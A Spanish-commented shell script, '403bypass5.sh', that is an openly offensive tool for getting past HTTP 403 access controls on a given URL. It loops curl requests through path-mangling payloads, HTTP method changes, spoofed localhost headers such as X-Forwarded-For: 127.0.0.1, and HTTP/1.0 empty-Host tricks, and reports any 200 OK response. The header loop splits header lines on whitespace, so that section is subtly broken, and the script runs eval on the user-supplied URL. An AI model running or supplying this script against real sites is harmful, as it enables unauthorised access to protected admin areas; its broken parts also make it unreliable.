#!/bin/sh
# 403bypass5.sh
# Adaptado para Bash ~1.0.x (compatible con shells antiguos)
# 
# Solo muestra 200 OK + petición curl completa (-v)

if [ $# -ne 1 ]; then
    echo "Uso: $0 <URL_COMPLETA>"
    echo "Ejemplos:"
    echo "  $0 https://target.com/admin/"
    echo "  $0 https://ejemplo.com/panel"
    exit 1
fi

FULL_TARGET="$1"

# Quitamos posible / final (truco simple compatible)
case "$FULL_TARGET" in
    */) FULL_TARGET=`echo "$FULL_TARGET" | sed 's/\/$//'` ;;
esac

echo ""
echo "============================================================="
echo " Pruebas de bypass 403 → $FULL_TARGET/"
echo " (solo se muestran respuestas 200 OK)"
echo "============================================================="
echo ""

# Payloads de path (usamos cat <<'EOF' para máxima compatibilidad)
payloads() {
    cat << 'EOF'
/
//
/.
/../${LAST_DIR}/
/%2e/
/%2e%2e/${LAST_DIR}/
/.;/
/..;/
/%20/
/%09/
/?
/%3f
/%23
/*
/.random
/index.aspx
/default.aspx
EOF
}

# Último directorio (basename compatible)
LAST_DIR=`basename "$FULL_TARGET"`

# Métodos
METHODS="GET HEAD OPTIONS POST"

special_headers() {
    cat << 'EOF'
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-For: 127.0.0.1:80
X-Forwarded-For: ::1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Client-IP: 127.0.0.1
X-Forwarded-Host: localhost
Forwarded: for=127.0.0.1;proto=https;by=localhost
EOF
}

# Función auxiliar (sin local)
run_curl() {
    cmd="$1"
    echo "$cmd"
    echo "--------------------------------------------------"

    # Ejecutamos curl -v -s -k -m 8 -o /dev/null -w '%{http_code}'
    output=`eval "$cmd -s -k -m 8 -v -o /dev/null -w '%{http_code}'" 2>&1`

    http_code=`echo "$output" | tail -n1`

    if [ "$http_code" = "200" ]; then
        echo "$output" | grep -v "^{" | grep -v "^}" | grep -v "^* "
        echo ""
        echo ">>> ÉXITO 200 OK DETECTADO <<<"
        echo "--------------------------------------------------"
        echo ""
    fi
}

# ────────────────────────────────────────────────
# 1. Variaciones de PATH + métodos
# ────────────────────────────────────────────────
echo "[*] 1. Variaciones de PATH + cambio de método"
echo "-------------------------------------------------------------"

for payload in `payloads`; do
    test_url="${FULL_TARGET}${payload}"

    for method in $METHODS; do
        cmd="curl -X $method -I \"$test_url\""
        run_curl "$cmd"
    done
done

# ────────────────────────────────────────────────
# 2. Cabeceras de spoofing (solo GET)
# ────────────────────────────────────────────────
echo ""
echo "[*] 2. Cabeceras de proxy / localhost spoofing (GET)"
echo "-------------------------------------------------------------"

for header in `special_headers`; do
    for extra in "" "/" "//" "/." "/..;/" "/.;/" "/ "; do
        test_url="${FULL_TARGET}${extra}"
        cmd="curl -X GET -I -H \"$header\" \"$test_url\""
        run_curl "$cmd"
    done
done

# ────────────────────────────────────────────────
# 3. Trucos HTTP/1.0 + Host vacío
# ────────────────────────────────────────────────
echo ""
echo "[*] 3. Trucos HTTP/1.0 + Host header vacío"
echo "-------------------------------------------------------------"

test_url="${FULL_TARGET}/"

# Normal
cmd="curl -I \"$test_url\""
run_curl "$cmd"

# HTTP/1.0 sin Host
cmd="curl --http1.0 -I \"$test_url\""
run_curl "$cmd"

# HTTP/1.0 + Host: vacío
cmd="curl --http1.0 -I -H \"Host:\" \"$test_url\""
run_curl "$cmd"

echo ""
